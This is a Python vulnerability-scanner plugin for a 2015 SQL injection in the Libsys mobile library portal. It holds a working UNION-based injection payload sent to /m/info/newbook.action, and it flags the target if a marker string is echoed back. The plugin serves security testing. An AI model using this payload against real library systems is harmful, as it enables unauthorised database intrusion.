# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Libsys_0001'  # 平台漏洞编号，留空
    name = '汇文软件通用型手机图书馆掌上门户 sql注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-01-22'  # 漏洞公布时间
    desc = '''
        汇文软件（Libsys）通用型手机图书馆掌上门户存在sql注入漏洞。
        /m/info/newbook.action
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '汇文软件'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '712210f2-b31b-4823-b1fb-dd90aab96521'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # http://www.wooyun.org/bugs/wooyun-2015-092533
            payload = "/m/info/newbook.action?clsNo=A'%20UNION%20ALL%20SELECT%20CHR(113)||CHR(118)||CHR(113)||CHR(118)||CHR(113)||CHR(76)||CHR(90)||CHR(104)||CHR(66)||CHR(102)||CHR(71)||CHR(105)||CHR(73)||CHR(100)||CHR(100)||CHR(113)||CHR(122)||CHR(98)||CHR(106)||CHR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL%20FROM%20DUAL--"
            verity_url = self.target + payload
            #code, head, res, errcode, _ = curl.curl2(url)
            r = requests.get(verity_url)

            if 'qvqvqLZhBfGiIddqzbjq' in r.content:
                #security_hole(arg + "/m/info/newbook.action?clsNo=A" + '   found sql injection!')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
